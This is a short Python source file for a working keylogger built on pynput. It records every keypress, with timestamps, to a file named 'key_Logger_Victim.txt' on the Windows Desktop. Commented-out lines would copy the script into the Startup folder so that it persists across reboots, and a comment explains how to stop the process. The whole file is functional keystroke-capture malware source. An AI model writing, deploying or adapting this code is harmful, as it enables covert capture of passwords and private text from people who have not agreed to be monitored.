from pynput.keyboard import Listener #pip install pynput
import os
import logging
# from shutil import copyfile

USERNAME = os.getlogin()
logging_directory = f'C:\\Users\\{USERNAME}\\Desktop'
# Destination = f"C:\\Users\\{USERNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
# copyfile("key_Logger.py", Destination) # this will lead to add program startup menu,To run programe Indefinently, Avoid this unless you know fully :)

# Un-comment these comments, and excecute with the programe will cause your pc run this code indefently in background. 
#In case you did these[You Idiot.. ] :) ,First interept the current kernal to stop the process and  go to task manager and kill the process named key_Logger mannually.

logging.basicConfig(filename=f"{logging_directory}\\key_Logger_Victim.txt",
                    level=logging.DEBUG, format="%(asctime)s    :    %(message)s")


def key_Logger_Handler(key):
    logging.info(key)


with Listener(on_press=key_Logger_Handler) as listener:
    listener.join()